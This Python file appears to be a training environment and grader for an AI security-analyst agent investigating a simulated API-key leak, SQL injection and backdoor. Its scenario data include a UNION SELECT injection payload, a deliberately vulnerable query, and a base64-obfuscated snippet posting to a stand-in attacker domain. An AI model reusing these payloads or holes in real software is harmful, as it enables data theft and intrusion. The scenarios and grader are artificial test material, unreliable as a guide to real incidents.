import sys
import os
import numpy as np
import base64
import random
from typing import Dict, Any, Tuple, Optional, List
from models import IncidentAction, IncidentObs

# --- ENVIRONMENT ---

TASK_MAP = {
    "easy": "leak-investigation",
    "medium": "sqli-detection",
    "hard": "backdoor-hunt"
}

class SentinelSOCEnv:
    def __init__(self):
        self.task = "leak-investigation" # default
        self.max_steps = 10
        self.reset()

    def reset(self, task: str = "easy") -> IncidentObs:
        internal = TASK_MAP.get(task, task)
        self.task = internal
        self.max_steps = {
            "leak-investigation": 10,
            "sqli-detection": 15,
            "backdoor-hunt": 20
        }.get(internal, 10)

        self.steps_taken = 0
        self.status = "Active"
        self.found_file = False
        self.found_ioc = False
        self.mitigated = False
        self.has_queried = False
        self.last_tool = None
        self.reward_total = 0.0
        self.history = [] # For UI visualization
        self._init_scenario()
        return self._get_obs()

    def _init_scenario(self):
        # NOTE: [HINT FOR ANALYST] 
        # Production keys start with 'sk_live'. 
        # Test keys start with 'sk_test' and are NOT critical.
        
        if self.task == "leak-investigation":
            self.target_file = "app.log"
            self.decoy_file = "config.py"
            self.target_ioc = "sk_live_51M0x2L9ABcdEF67890"
            self.decoy_ioc = "sk_test_dev_fake_key_999"
            
            self.incident_thread = (
                "[ALERT] Automated scanner detected 'sk_live' pattern in production logs!"
            )
            # Explicitly naming the log file in the log lines to guide the agent
            self.logs = (
                "2024-04-11 12:01:01 INFO [system]: System Heartbeat OK\n"
                "2024-04-11 12:01:45 DEBUG [app.log]: [DECOY] Initializing Test Suite with sk_test_dev_fake_key_999\n"
                "2024-04-11 12:01:46 CRITICAL [app.log]: [LEAK] Production client initialized with: sk_live_51M0x2L9ABcdEF67890\n"
                "2024-04-11 12:02:00 WARNING [config.py]: recent modification by 'dev_user'"
            )
            self.code_snippet = "# config.py\nDEBUG = True\n# TODO: Move keys to env vars"
        
        elif self.task == "sqli-detection":
            self.target_file = "db_utils.py"
            self.decoy_file = "db_backup.log"
            self.target_ioc = "192.168.1.137"
            self.decoy_ioc = "10.0.0.5"
            
            self.incident_thread = "[ALERT] Unusual database query volume detected from 192.168.1.137."
            self.logs = (
                "10.0.0.5 - - [11/Apr/2024:12:00:01] 'GET /health HTTP/1.1' 200\n"
                "192.168.1.137 - - [11/Apr/2024:12:05:01] 'GET /user?id=1' UNION SELECT credit_card FROM users -- HTTP/1.1' 200"
            )
            self.code_snippet = "def get_user(id):\n    # POTENTIALLY VULNERABLE\n    return db.execute(f'SELECT * FROM users WHERE id={id}')"

        elif self.task == "backdoor-hunt":
            self.target_file = "vendor/auth_lib.py"
            self.decoy_file = "auth_config.json"
            self.target_ioc = "attacker-domain.cc"
            self.decoy_ioc = "meta-auth.com"
            
            self.incident_thread = "[CRITICAL] Unauthorized egress detected to unknown endpoint."
            self.logs = (
                "NETWORK: 172.16.0.5 -> meta-auth.com:443 (Authorized)\n"
                "NETWORK: 172.16.0.5 -> attacker-domain.cc:443 (UNAUTHORIZED)"
            )
            encoded_val = base64.b64encode(b"attacker-domain.cc").decode()
            self.code_snippet = f"""
# vendor/auth_lib.py
import base64
def sync():
    target = base64.b64decode("{encoded_val}").decode()
    requests.post(f'https://{{target}}/ping')
"""

    def _get_obs(self) -> IncidentObs:
        # Build explicit next-step guidance
        if not self.has_queried:
            guidance = "NEXT STEP: Call query_logs to begin investigation."
        elif not self.found_ioc and not self.found_file:
            guidance = "NEXT STEP: Call extract_ioc with the suspicious indicator found in logs, OR call inspect_file with a suspicious filename."
        elif self.found_ioc and not self.found_file:
            guidance = "IOC CONFIRMED. NEXT STEP: Call inspect_file to identify the root cause file."
        elif self.found_file and not self.found_ioc:
            guidance = "FILE IDENTIFIED. NEXT STEP: Call extract_ioc to confirm the indicator of compromise."
        elif self.found_file and self.found_ioc:
            guidance = "BOTH IOC AND FILE CONFIRMED. NEXT STEP: Call apply_fix to resolve the incident."
        else:
            guidance = "Investigation complete."

        return IncidentObs(
            logs=self.logs,
            code_snippet=self.code_snippet,
            incident_thread=self.incident_thread + f"\n\n[ANALYST SYSTEM]: {guidance}",
            status=self.status,
            steps_remaining=self.max_steps - self.steps_taken,
            reward_signal=float(round(self.reward_total, 2))
        )

    def step(self, action: IncidentAction) -> Tuple[IncidentObs, float, bool, Dict]:
        self.steps_taken += 1
        reward = 0.0
        done = False
        tool = action.tool.lower()
        params = action.parameters.lower().strip()
        
        # --- REPEAT PENALTY ---
        if tool == self.last_tool:
            reward -= 0.05
        self.last_tool = tool
        
        if tool == "query_logs":
            if self.has_queried:
                reward = -0.05  # penalty for repeating query_logs
                tool_result = "WARNING: Logs already analyzed. No new information. Proceed to extract_ioc or inspect_file."
                feedback = "✖ Redundant Reconnaissance"
            else:
                self.has_queried = True
                reward = 0.1
                if self.task == "leak-investigation":
                    tool_result = f"Logs analyzed. Found suspicious pattern: sk_live key in app.log. Recommend: extract_ioc with 'sk_live_51M0x2L9ABcdEF67890' and inspect_file with 'app.log'"
                elif self.task == "sqli-detection":
                    tool_result = f"Logs analyzed. Found SQL injection attempt from IP 192.168.1.137 targeting db_utils.py. Recommend: extract_ioc with '192.168.1.137' and inspect_file with 'db_utils.py'"
                elif self.task == "backdoor-hunt":
                    tool_result = f"Logs analyzed. Found unauthorized egress to attacker-domain.cc originating from vendor/auth_lib.py. Recommend: extract_ioc with 'attacker-domain.cc' and inspect_file with 'vendor/auth_lib.py'"
                else:
                    tool_result = f"Logs returned for query: {params}"
                
                feedback = "Initial investigative reconnaissance initiated"
            
        elif tool == "extract_ioc":
            if not self.has_queried:
                reward = -0.15
                tool_result = "REJECTED: Must investigate logs for clues before extraction."
            elif self.found_ioc:
                reward = -0.05
                tool_result = "INFO: Indicator of Compromise already confirmed. Do not repeat."
            elif params == self.decoy_ioc.lower():
                reward = -0.2
                tool_result = f"WARNING: {params} is a known SAFE or DECOY indicator. Do not escalate."
            elif self.target_ioc.lower() in params:
                self.found_ioc = True
                reward = 0.3
                tool_result = f"SUCCESS: IOC {self.target_ioc} confirmed! NEXT STEP: Identify the root cause file using 'inspect_file' and then 'apply_fix'."
                feedback = "High-confidence indicator of compromise detected"
            else:
                reward = -0.05
                tool_result = f"FAILURE: Indicator {params} not confirmed in dataset."
                feedback = "Potential false positive: Signal not verified"

        elif tool == "inspect_file":
            if params == self.decoy_file.lower():
                reward = -0.05
                tool_result = f"RED HERRING: {params} shows suspicious activity but is not the root cause."
            elif params == self.target_file.lower():
                self.found_file = True
                reward = 0.2
                tool_result = f"CRITICAL: Resource {self.target_file} identified as exploit source. NEXT STEP: If IOC is also confirmed, call 'apply_fix' to close the incident."
                feedback = "✔ Root Cause File Identified"
            else:
                reward = -0.05
                tool_result = f"INFO: No proof of compromise in {params}."
                feedback = "✖ No Malicious Artifacts"

        elif tool == "apply_fix":
            if self.found_file and self.found_ioc:
                self.mitigated = True
                self.status = "Mitigation Active"
                reward = 0.4
                tool_result = "SUCCESS: Incident mitigated. Monitoring for recurrence."
                feedback = "Mitigation applied — monitoring for recurrence"
                done = True
            else:
                reward = -0.15
                tool_result = "REJECTED: Cannot fix. Requires verified File and IOC first."
                feedback = "✖ Premature Mitigation Attempt"
        
        else:
            reward = -0.1
            tool_result = f"Invalid tool: {tool}"

        self.reward_total += reward
        
        # Log to history for the Forensic Dashboard
        conf = round(0.90 if reward > 0 else 0.25, 2)
        self.history.append({
            "step": self.steps_taken,
            "reasoning": action.reasoning,
            "tool": tool,
            "params": params,
            "reward": round(float(reward), 2),
            "cumulative": round(float(self.reward_total), 2),
            "status": "SUCCESS" if reward > 0 else "REJECTED" if reward < 0 else "INFO",
            "feedback": locals().get('feedback', "Investigation update"),
            "confidence": conf
        })

        if self.steps_taken >= self.max_steps:
            done = True
            
        return self._get_obs(), reward, done, {"tool_result": tool_result}

    def grade(self) -> float:
        base_score = 0.01
        if self.has_queried: base_score += 0.1
        if self.found_ioc: base_score += 0.3
        if self.found_file: base_score += 0.2
        if self.mitigated: base_score += 0.38
        
        # Efficiency scaling (15% impact from steps)
        penalty = (self.steps_taken / self.max_steps) * 0.15
        final_score = base_score - penalty
        return float(round(np.clip(final_score, 0.01, 0.99), 3))
